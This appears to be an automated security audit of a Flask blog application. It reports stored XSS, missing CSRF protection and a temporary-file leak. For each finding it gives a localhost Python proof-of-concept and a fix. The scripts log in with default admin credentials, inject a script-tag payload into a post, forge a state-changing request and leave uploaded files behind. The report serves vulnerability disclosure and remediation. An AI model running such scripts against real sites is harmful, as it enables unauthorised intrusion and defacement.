====

Auto Security Analysis of blog-eletrix-fr at 2026-03-07
CRITICAL - Stored Cross-Site Scripting (XSS)
The blog post rendering process uses the Jinja2 `|safe` filter on Markdown content converted via `markdown2.markdown()`. Since there is no input sanitization when creating a post in `routes/post.py` or before rendering, an authenticated user can inject arbitrary HTML and JavaScript into a blog post. This script will execute in the context of any user who views the post, potentially leading to session hijacking, defacement, or redirection to malicious sites.

PoC
```python
import urllib.request
import urllib.parse
import http.cookiejar

def test_xss():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Login
    login_data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode()
    opener.open('http://localhost:5000/login', login_data)

    # Create post with XSS
    xss_payload = '<script>alert("XSS")</script>'
    post_data = urllib.parse.urlencode({
        'title': 'XSS Test',
        'author': 'attacker',
        'tags': 'test',
        'content': f'This is a test post. {xss_payload}'
    }).encode()
    opener.open('http://localhost:5000/create_post', post_data)

    # Check if XSS is present
    response = opener.open('http://localhost:5000/post/XSS_Test')
    content = response.read().decode()
    if xss_payload in content:
        print("XSS Vulnerability confirmed!")
    else:
        print("XSS Vulnerability not found.")

if __name__ == "__main__":
    test_xss()
```

Fix
Remove the `|safe` filter from `html/post.html` and use a sanitization library like `bleach` to clean the HTML output of `markdown2.markdown()` before passing it to the template.

====

====

Auto Security Analysis of blog-eletrix-fr at 2026-03-07
MEDIUM - Cross-Site Request Forgery (CSRF)
The application does not implement any CSRF protection mechanisms on state-changing routes like `/login`, `/create_post`, and `/upload`. An attacker can trick an authenticated administrator into visiting a malicious website that submits a hidden form to these routes, performing actions on behalf of the administrator, such as creating unauthorized posts or uploading malicious files.

PoC
```python
import urllib.request
import urllib.parse
import http.cookiejar
import os

def test_csrf():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Login to get a session cookie (simulating an active session)
    login_data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode()
    opener.open('http://localhost:5000/login', login_data)

    # Simulate a CSRF attack: performing an action without a CSRF token
    csrf_post_title = 'CSRF_Victim'
    attack_data = urllib.parse.urlencode({
        'title': csrf_post_title,
        'author': 'hacker',
        'tags': 'csrf',
        'content': 'This post was created via CSRF!'
    }).encode()

    opener.open('http://localhost:5000/create_post', attack_data)

    if os.path.exists(f'./articles/CSRF_Victim.md'):
        print("CSRF Vulnerability confirmed: Post created without CSRF token!")
    else:
        print("CSRF Vulnerability not confirmed.")

if __name__ == "__main__":
    test_csrf()
```

Fix
Implement CSRF protection by using a library like `Flask-WTF` and including CSRF tokens in all forms and verifying them on the server side.

====

====

Auto Security Analysis of blog-eletrix-fr at 2026-03-07
LOW - Temporary File Leakage and Potential DoS
The `/upload` route in `routes/upload.py` saves uploaded files to a temporary directory `./temp_uploads` before processing them with `utils.add_watermark`. If `add_watermark` fails (e.g., if the file is not a valid image), an exception is raised, and the temporary file is never deleted. This can lead to disk space exhaustion (DoS) over time if an attacker repeatedly uploads large invalid files.

PoC
```python
import urllib.request
import urllib.parse
import http.cookiejar
import os

def test_dos_upload():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # Login
    login_data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode()
    opener.open('http://localhost:5000/login', login_data)

    # Create a non-image file
    filename = "test_leak.txt"
    with open(filename, 'w') as f:
        f.write('not an image content' * 100)

    # Upload non-image file
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    parts = [
        f'--{boundary}',
        f'Content-Disposition: form-data; name="file"; filename="{filename}"',
        'Content-Type: text/plain',
        '',
        'not an image content',
        f'--{boundary}--',
        ''
    ]
    body = '\r\n'.join(parts).encode()

    request = urllib.request.Request('http://localhost:5000/upload/', data=body)
    request.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')

    try:
        opener.open(request)
    except:
        pass # Expected failure

    if filename in os.listdir('./temp_uploads'):
        print(f"DoS/File Leak confirmed: {filename} still in temp_uploads")
    else:
        print("DoS/File Leak not found.")

if __name__ == "__main__":
    test_dos_upload()
```

Fix
Use a `try...finally` block to ensure that the temporary file is deleted regardless of whether processing succeeds or fails.

====

Summary:
| Severity | Exploit Name |
|---|---|
| CRITICAL | Stored Cross-Site Scripting (XSS) |
| MEDIUM | Cross-Site Request Forgery (CSRF) |
| LOW | Temporary File Leakage and Potential DoS |
